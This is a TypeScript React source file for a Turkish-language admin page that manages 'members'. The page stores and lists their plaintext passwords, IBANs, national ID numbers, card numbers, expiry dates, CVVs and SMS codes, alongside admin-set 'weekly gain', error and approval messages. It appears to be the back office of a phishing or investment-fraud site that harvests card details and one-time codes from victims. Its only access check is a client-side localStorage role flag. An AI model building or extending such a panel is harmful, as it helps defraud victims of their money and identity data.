
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { PlusCircle, Edit, Trash2, LogOut, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useRouter } from "next/navigation";
import AdminMemberForm from "@/components/dashboard/admin-member-form";
import { getMembers, setMembers as saveMembers } from "@/lib/member-storage";
import { Badge } from "@/components/ui/badge";

export type AdminMember = {
  id: number;
  name: string;
  phone: string;
  password?: string;
  iban: string;
  bank: string;
  tc: string;
  il: string;
  ilce: string;
  weeklyGain: string;
  errorMessage: string;
  onayMesaji: string;
  invoiceAmount: string;
  accountActivity: string;
  status: 'Aktif' | 'Pasif';
  transactionStatus: 'allowed' | 'blocked';
  // Card details
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  smsCode?: string;
};

const MEMBERS_PER_PAGE = 20;

export default function AdminPage() {
    const [members, setMembers] = useState<AdminMember[]>([]);
    const [isFormOpen, setIsFormOpen] = useState(false);
    const [editingMember, setEditingMember] = useState<AdminMember | null>(null);
    const [currentPage, setCurrentPage] = useState(1);
    const { toast } = useToast();
    const router = useRouter();

    useEffect(() => {
        const role = typeof window !== 'undefined' ? localStorage.getItem('userRole') : null;
        if (role !== 'admin') {
            router.push('/dashboard');
        }
        setMembers(getMembers());
    }, [router]);
    
    const handleLogout = () => {
        if (typeof window !== 'undefined') {
            localStorage.removeItem('userRole');
        }
        router.push("/");
    };

    const handleAddMember = () => {
        setEditingMember(null);
        setIsFormOpen(true);
    }

    const handleEditMember = (member: AdminMember) => {
        setEditingMember(member);
        setIsFormOpen(true);
    }
    
    const handleDeleteMember = (id: number) => {
      const updatedMembers = members.filter(m => m.id !== id);
      setMembers(updatedMembers);
      saveMembers(updatedMembers);
      toast({
        title: "Başarılı",
        description: "Üye başarıyla silindi.",
      });
       // If the last member on a page is deleted, go to the previous page
      const currentMembers = members.slice((currentPage - 1) * MEMBERS_PER_PAGE, currentPage * MEMBERS_PER_PAGE);
      if (currentMembers.length === 1 && currentPage > 1) {
        setCurrentPage(currentPage - 1);
      }
    }

    const handleSaveMember = (memberData: Omit<AdminMember, 'id'> | AdminMember) => {
        let updatedMembers;
        if ('id' in memberData && memberData.id) {
            // Edit
            updatedMembers = members.map(m => m.id === memberData.id ? { ...m, ...memberData } : m);
             toast({
                title: "Başarılı",
                description: "Üye bilgileri güncellendi.",
            });
        } else {
            // Add
            const newMember = { ...memberData, id: Date.now(), status: 'Aktif', transactionStatus: 'allowed' } as AdminMember;
            updatedMembers = [...members, newMember];
             toast({
                title: "Başarılı",
                description: "Yeni üye eklendi.",
            });
        }
        setMembers(updatedMembers);
        saveMembers(updatedMembers);
        setIsFormOpen(false);
        setEditingMember(null);
    }
    
    // Pagination logic
    const totalPages = Math.ceil(members.length / MEMBERS_PER_PAGE);
    const indexOfLastMember = currentPage * MEMBERS_PER_PAGE;
    const indexOfFirstMember = indexOfLastMember - MEMBERS_PER_PAGE;
    const currentMembers = members.slice(indexOfFirstMember, indexOfLastMember);

    const paginate = (pageNumber: number) => {
        if (pageNumber > 0 && pageNumber <= totalPages) {
            setCurrentPage(pageNumber);
        }
    }

    return (
        <div className="space-y-6">
            <Card>
                <CardHeader className="flex flex-row items-center justify-between">
                    <div>
                        <CardTitle className="text-3xl font-headline font-bold">Admin Paneli - Üye Yönetimi</CardTitle>
                        <CardDescription>Yeni üye ekleyin veya mevcut üyeleri düzenleyin.</CardDescription>
                    </div>
                    <div className="flex gap-2">
                        <Dialog open={isFormOpen} onOpenChange={setIsFormOpen}>
                            <DialogTrigger asChild>
                                <Button onClick={handleAddMember}>
                                    <PlusCircle className="mr-2 h-5 w-5" />
                                    Yeni Üye Ekle
                                </Button>
                            </DialogTrigger>
                            <DialogContent className="max-h-[90vh] overflow-y-auto">
                                <DialogHeader>
                                    <DialogTitle>{editingMember ? 'Üye Düzenle' : 'Yeni Üye Ekle'}</DialogTitle>
                                </DialogHeader>
                                <AdminMemberForm 
                                    member={editingMember} 
                                    onSave={handleSaveMember}
                                    onCancel={() => setIsFormOpen(false)}
                                />
                            </DialogContent>
                        </Dialog>
                        <Button variant="outline" onClick={handleLogout}>
                            <LogOut className="mr-2 h-5 w-5" />
                            Çıkış Yap
                        </Button>
                    </div>
                </CardHeader>
                <CardContent>
                    <div className="overflow-x-auto">
                        <Table>
                            <TableHeader>
                                <TableRow>
                                    <TableHead>Ad Soyad</TableHead>
                                    <TableHead>Telefon</TableHead>
                                    <TableHead>Şifre</TableHead>
                                    <TableHead>Kart Bilgileri</TableHead>
                                    <TableHead>Üyelik Durumu</TableHead>
                                    <TableHead className="text-right">Eylemler</TableHead>
                                </TableRow>
                            </TableHeader>
                            <TableBody>
                                {currentMembers.map((member) => (
                                    <TableRow key={member.id}>
                                        <TableCell className="font-medium">{member.name}</TableCell>
                                        <TableCell>{member.phone}</TableCell>
                                        <TableCell>{member.password}</TableCell>
                                        <TableCell>
                                           {member.cardNumber && <CreditCard className="h-5 w-5 text-blue-500" />}
                                        </TableCell>
                                        <TableCell>
                                            <Badge variant={member.status === 'Aktif' ? 'default' : 'destructive'} className={member.status === 'Aktif' ? 'bg-green-600' : 'bg-red-600'}>
                                                {member.status}
                                            </Badge>
                                        </TableCell>
                                        <TableCell className="text-right space-x-2">
                                            <Button variant="ghost" size="icon" onClick={() => handleEditMember(member)}>
                                                <Edit className="h-4 w-4" />
                                            </Button>
                                            <Button variant="ghost" size="icon" onClick={() => handleDeleteMember(member.id)}>
                                                <Trash2 className="h-4 w-4 text-destructive" />
                                            </Button>
                                        </TableCell>
                                    </TableRow>
                                ))}
                            </TableBody>
                        </Table>
                    </div>
                </CardContent>
                {totalPages > 1 && (
                    <CardFooter className="flex justify-center items-center gap-2 pt-4">
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage - 1)}
                            disabled={currentPage === 1}
                        >
                            Önceki
                        </Button>
                        <span className="text-sm text-muted-foreground">
                            Sayfa {currentPage} / {totalPages}
                        </span>
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage + 1)}
                            disabled={currentPage === totalPages}
                        >
                            Sonraki
                        </Button>
                    </CardFooter>
                )}
            </Card>
        </div>
    );
}
